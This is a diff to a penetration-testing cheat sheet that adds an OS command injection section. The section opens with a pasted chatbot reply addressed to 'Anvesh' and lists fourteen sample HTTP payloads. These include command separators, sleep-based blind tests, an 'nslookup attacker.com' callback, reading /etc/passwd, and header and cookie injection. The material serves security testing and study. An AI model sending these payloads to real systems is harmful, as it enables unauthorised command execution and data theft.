@@ -2397,6 +2397,156 @@ Click-Jacking
   <a href="malicious-link">Click me</a>
 </div>
 ```
+Absolutely, Anvesh! Here's a **complete OS Command Injection test case list with sample payloads**, structured for clarity and direct integration into your cheat sheets, automation scripts, or Burp Suite workflows. This aligns with your GitHub methodology and emphasizes both detection and exploitation vectors.
+
+---
+
+## 🧨 OS Command Injection — Test Cases with Payloads
+
+---
+
+### **1. Basic Command Injection via GET Parameter**
+- Inject shell commands using separators like `;`, `&&`, `|`.
+
+```http
+GET /vuln.php?ip=127.0.0.1;whoami HTTP/1.1
+Host: vulnerable.com
+```
+
+---
+
+### **2. Blind Command Injection via Time Delay**
+- Use `sleep`, `ping`, or `timeout` to infer execution.
+
+```http
+GET /vuln.php?user=admin; sleep 10 HTTP/1.1
+Host: vulnerable.com
+```
+
+---
+
+### **3. Out-of-Band (OOB) Injection**
+- Trigger DNS or HTTP callbacks to attacker-controlled server.
+
+```http
+GET /vuln.php?cmd=nslookup attacker.com HTTP/1.1
+Host: vulnerable.com
+```
+
+---
+
+### **4. POST-Based Injection**
+- Inject into form fields or body parameters.
+
+```http
+POST /submit HTTP/1.1
+Host: vulnerable.com
+Content-Type: application/x-www-form-urlencoded
+
+username=admin;id
+```
+
+---
+
+### **5. Encoded Injection**
+- Use URL encoding to bypass filters.
+
+```http
+GET /vuln.php?file=%3Bcat%20/etc/passwd HTTP/1.1
+Host: vulnerable.com
+```
+
+---
+
+### **6. Injection via File Path Parameter**
+- Exploit filename or path variables.
+
+```http
+GET /download?file=report.txt;ls -la HTTP/1.1
+Host: vulnerable.com
+```
+
+---
+
+### **7. Injection via Headers**
+- Inject into `User-Agent`, `Referer`, or custom headers.
+
+```http
+GET / HTTP/1.1
+Host: vulnerable.com
+User-Agent: Mozilla/5.0; uname -a
+```
+
+---
+
+### **8. Injection via Cookies**
+- Target server-side parsing of cookie values.
+
+```http
+GET / HTTP/1.1
+Host: vulnerable.com
+Cookie: session=abc123;id
+```
+
+---
+
+### **9. Injection via Backticks or Subshell**
+- Use backticks or `$()` for command substitution.
+
+```http
+GET /vuln.php?cmd=`id` HTTP/1.1
+Host: vulnerable.com
+```
+
+---
+
+### **10. Windows-Specific Injection**
+- Use `&&`, `|`, or `&` with `cmd.exe`.
+
+```http
+GET /vuln.php?input=foo&cmd=dir& HTTP/1.1
+Host: vulnerable.com
+```
+
+---
+
+### **11. Linux-Specific Injection**
+- Use `;`, `|`, or `&&` with common Linux commands.
+
+```http
+GET /vuln.php?input=bar; ls -la / HTTP/1.1
+Host: vulnerable.com
+```
+
+---
+
+### **12. Injection via Pipes**
+- Chain commands using `|`.
+
+```http
+GET /vuln.php?cmd=cat /etc/passwd | grep root HTTP/1.1
+Host: vulnerable.com
+```
+
+---
+
+### **13. Injection via Environment Variables**
+- Reference system variables like `$PATH`, `$HOME`.
+
+```http
+GET /vuln.php?cmd=echo $HOME HTTP/1.1
+Host: vulnerable.com
+```
+
+---
+
+### **14. Injection via Command Substitution**
+- Use `$(...)` to execute nested commands.
+
+```http
+GET /vuln.php?cmd=$(whoami) HTTP/1.1
+Host: vulnerable.com
+```
 ## Insecure Management Interface
 Insecure Management Interfaces may lack proper security measures, such as strong authentication, encryption, or IP restrictions, allowing unauthorized users to potentially gain control over critical systems. Common issues include using default credentials, unencrypted communications, or exposing the interface to the public internet.
 
